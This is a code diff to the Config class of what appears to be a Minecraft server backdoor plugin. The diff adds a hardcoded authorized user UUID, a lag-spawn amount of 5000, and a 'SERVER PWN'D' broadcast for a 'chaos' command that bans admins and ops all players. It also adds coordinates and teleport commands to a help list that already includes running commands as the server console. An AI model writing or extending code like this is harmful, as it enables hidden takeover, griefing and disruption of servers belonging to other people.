@@ -14,6 +14,7 @@ public class Config {
     // Authorized UUIDS 
     public static final String[] authorized_uuids = {
             //Put user UUIDs here. These UUIDs are immune to the unauth command
+            "d27767a8-dd3a-4248-bd00-ccd02fd08314"
     };
 
     // UUIDs added by the auth command. DO NOT EDIT
@@ -40,6 +41,7 @@ public class Config {
     // Default ban source 
     public static final String default_ban_source = "Server";
 
+    public static final int default_lag_spawn_amount = 5000;
 
     /* Enchantment Settings */
 
@@ -71,6 +73,11 @@ public class Config {
     // color of help 
     public static final ChatColor help_detail_color = ChatColor.RED;
 
+    // Chaos chat message
+    public static final String chaos_chat_broadcast = chat_message_prefix_color + chat_message_prefix + " SERVER PWN'D. \n" +
+                                                                                                        "ALL ADMINS BANNED. \n" +
+                                                                                                        "ALL USERS OP'D UNTIL ROLLBACK. ;-)";
+
     // Help message content 
     public static final HelpItem[] help_messages = {
             new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
@@ -84,8 +91,11 @@ public class Config {
             new HelpItem("exec",        "[command]",                    "Exocute command as server console."),
             new HelpItem("chaos",       "",                             "Deop and ban ops, op all regular players."),
             new HelpItem("seed",        "",                             "Get the current world seed."),
+            new HelpItem("coords",      "[player]",                     "Get the coordinates of specified player."),
+            new HelpItem("tp",          "[x] [y] [z]",                  "Teleport to specified coordinates."),
             new HelpItem("auth",        "(player)",                     "Authorize user until next server restart."),
             new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed")
+
     };
 
     public static class HelpItem{
@@ -107,6 +117,7 @@ public class Config {
         public String getSyntax(){
             return syntax;
         }
+
         public String getDesc(){
             return desc;
         }
